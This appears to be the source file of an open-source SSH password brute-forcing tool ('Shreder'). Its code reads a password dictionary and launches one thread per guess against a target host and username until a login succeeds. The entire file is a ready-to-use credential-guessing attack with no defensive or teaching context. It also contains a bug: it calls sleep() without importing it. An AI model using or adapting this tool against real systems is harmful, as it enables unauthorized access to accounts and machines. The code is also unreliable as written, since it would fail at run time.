"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import time
import threading

from typing import Union
from badges import Badges

from pex.proto.ssh import SSHClient


class Shreder(Badges):
    """ Main class of shreder module.

    This main class of shreder module is intended for providing
    implementations of SSH protocol brute-forcing methods.
    """

    password = ""

    def connect(self, host: str, port: int, username: str, password: str) -> None:
        """ Connect to the remote host.

        :param str host: host to connect to
        :param int port: port to connect to
        :param str username: username to authenticate with
        :param str password: password to authenticate with
        :return None: None
        """

        client = SSHClient(
            host=host,
            port=int(port),
            username=username,
            password=password
        )

        try:
            client.connect()
            self.password = password
            client.disconnect()

        except BaseException:
            pass

    def brute(self, host: str, port: int, username: str, dictionary: str,
              delay: Union[float, int] = 0.1) -> str:
        """ Start brute-forcing threads for the specified host and get password.

        :param str host: host to brute-force
        :param int port: port to brute-force
        :param str username: username to brute-force with
        :param str dictionary: name of the file containing passwords to
        bruteforce with
        :param Union[float, int] delay: delay between each thread
        :return str: obtained password
        """

        with open(dictionary, 'r') as f:
            threads = list()
            lines = f.read().split('\n')

            for password in lines:
                if password.strip():
                    threads.append(
                        threading.Thread(
                            target=self.connect,
                            args=[host, port, username, password]
                        )
                    )

            line = "/-\\|"
            counter = 0
            tried = 1

            for thread in threads:
                if not self.password:
                    if counter >= len(line):
                        counter = 0
                    self.print_process(
                        f"Processing... {line[counter]} | Passwords tried: {tried}/{str(len(threads))}", end=''
                    )

                    sleep(delay)
                    thread.start()

                    counter += 1
                    tried += 1

            self.print_empty(end='')

            for thread in threads:
                if thread.is_alive():
                    thread.join()

        return self.password
